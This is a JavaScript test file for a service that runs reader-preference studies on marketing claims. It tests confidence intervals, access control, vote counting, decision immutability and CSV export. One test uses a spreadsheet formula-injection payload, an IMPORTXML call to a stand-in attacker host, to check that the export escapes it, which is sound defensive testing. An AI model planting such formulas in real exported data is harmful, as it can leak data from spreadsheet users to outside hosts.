import test from 'node:test';import assert from 'node:assert/strict';
import {randomUUID} from 'node:crypto';
import {Store} from '../server/store.mjs';import {JudgeService} from '../server/service.mjs';
import {ComparisonService} from '../server/comparison.mjs';import {ResearchService,wilson95} from '../server/research.mjs';
import {DEMOS} from '../shared/domain.mjs';
const cmd=(s,o={})=>({commandId:randomUUID(),expectedVersion:s.version,...o});
function fixture(t){const db=new Store(':memory:');t.after(()=>db.close());const judge=new JudgeService(db),compare=new ComparisonService(judge);judge.comparison=compare;const research=new ResearchService(judge);
 let d=judge.create('author',{claim:DEMOS[0].claim,draft:DEMOS[0]});const id=d.state.id;
 d=judge.act('author',id,cmd(d.state,{action:'narrow'}));d=judge.prepare('author',id,cmd(d.state,{draft:DEMOS[0]}));d=judge.verdict('author',id,cmd(d.state,{claim:'Создавайте маркетинговый материал для вашего проекта.',acknowledged:true}));
 d=compare.start('author',id,cmd(d.state,{consent:true}));return {db,judge,compare,research,id,studyId:d.comparisons[0].id,d};}
test('Wilson 95 bounds are exact at 0/0 and approximate at 5/10',()=>{
 assert.deepEqual(wilson95(0,0),{low:null,high:null});const r=wilson95(5,10);
 assert.ok(r.low>0.23&&r.low<0.24);assert.ok(r.high>0.76&&r.high<0.77);
 assert.throws(()=>wilson95(11,10),RangeError);
});
test('study metadata snapshots an actual comparison; outsiders cannot read results',t=>{
 const {research,id,studyId}=fixture(t);
 const r=research.create('author',{caseId:id,comparisonId:studyId,hypothesis:'Уточнённое обещание кажется читателям понятнее исходного',targetResponses:8});
 assert.equal(r.sample.total,0);assert.equal(r.preference.aInterval.low,null);
 assert.equal(r.targetResponses,8);assert.match(r.disclaimer,/не репрезентативная/i);
 assert.throws(()=>research.detail('stranger',r.id),e=>e.code==='NOT_FOUND');
 assert.throws(()=>research.create('stranger',{caseId:id,comparisonId:studyId,hypothesis:'Проверка внешним человеком не разрешается',targetResponses:8}),e=>e.code==='NOT_FOUND');
});
test('study counts reflect only actual reader votes, not synthetic model estimates',t=>{
 const {judge,compare,research,id,studyId,d}=fixture(t);
 const r=research.create('author',{caseId:id,comparisonId:studyId,hypothesis:'Новая фраза понятнее и содержит действие пользователя',targetResponses:5});
 const inv=compare.invite('author',id,cmd(d.state,{comparisonId:studyId}));
 compare.vote('reader',inv.comparisonInvite.token,{choice:'neither',note:'Нужно привести пример для доверия',accepted:true});
 const actual=research.detail('author',r.id);
 assert.equal(actual.sample.total,1);assert.equal(actual.sample.neither,1);assert.equal(actual.sample.decisive,0);
 assert.equal(actual.preference.a,null);
 assert.equal(actual.sample.targetReached,false);
});
test('research decision is owned, immutable, and includes rationale',t=>{
 const {research,id,studyId}=fixture(t);
 const r=research.create('author',{caseId:id,comparisonId:studyId,hypothesis:'Аудитория лучше понимает конкретное обещание',targetResponses:5});
 const result=research.conclude('author',r.id,{decision:'inconclusive',note:'Недостаточно реальных голосов для обоснованного решения.'});
 assert.equal(result.decision,'inconclusive');
 assert.throws(()=>research.conclude('author',r.id,{decision:'retain',note:'Можно сохранить текст для рекламной кампании.'}),e=>e.code==='STATE');
});
test('stale verdict forces research conclusion to inconclusive',t=>{
 const {judge,research,id,studyId}=fixture(t);
 const r=research.create('author',{caseId:id,comparisonId:studyId,hypothesis:'Читатели должны лучше понимать сообщение без контекста',targetResponses:5});
 const s=judge.detail('author',id).state;
 judge.reopen('author',id,cmd(s));
 assert.equal(research.detail('author',r.id).basedOnCurrentVerdict,false);
 assert.throws(()=>research.conclude('author',r.id,{decision:'retain',note:'Нет прямых сведений о предпочтениях читателей.'}),e=>e.code==='STALE_VERDICT');
 assert.equal(research.conclude('author',r.id,{decision:'inconclusive',note:'Вердикт пересмотрен до завершения исследования.'}).status,'concluded');
});
test('CSV quoting guards formula injection and case deletion cascades',t=>{
 const {judge,research,db,id,studyId}=fixture(t);
 research.create('author',{caseId:id,comparisonId:studyId,hypothesis:'=IMPORTXML("https://evil.invalid", "//x")',targetResponses:5});
 const csv=research.exportCSV('author');assert.match(csv,/"'=IMPORTXML/);
 judge.deleteCase('author',id);
 assert.equal(db.one('SELECT COUNT(*) AS n FROM research_studies').n,0);
});
